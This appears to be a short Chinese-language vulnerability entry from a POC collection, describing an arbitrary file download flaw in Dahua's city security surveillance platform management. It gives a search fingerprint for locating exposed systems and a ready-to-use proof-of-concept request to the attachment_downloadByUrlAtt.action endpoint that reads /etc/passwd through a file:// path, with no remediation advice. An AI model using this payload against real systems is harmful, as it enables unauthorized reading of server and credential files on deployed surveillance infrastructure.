# 大华 城市安防监控系统平台管理 attachment_downloadByUrlAtt.action 任意文件下载漏洞

## 漏洞描述

大华城市安防监控系统平台管理存在任意文件下载漏洞，攻击者通过漏洞可以下载服务器上的任意文件

## 漏洞影响

<a-checkbox checked>大华城市安防监控系统平台管理</a-checkbox></br>

## 网络测绘

<a-checkbox checked>"attachment_downloadByUrlAtt.action"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1647528195700-90c15ce4-496f-4976-8538-8b39e1f248af.png)

验证POC

```javascript
/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
```

![img](../../../.vuepress/public/img/1647528297462-f92141b3-fa43-4cce-9717-13ba3b144dc7.png)
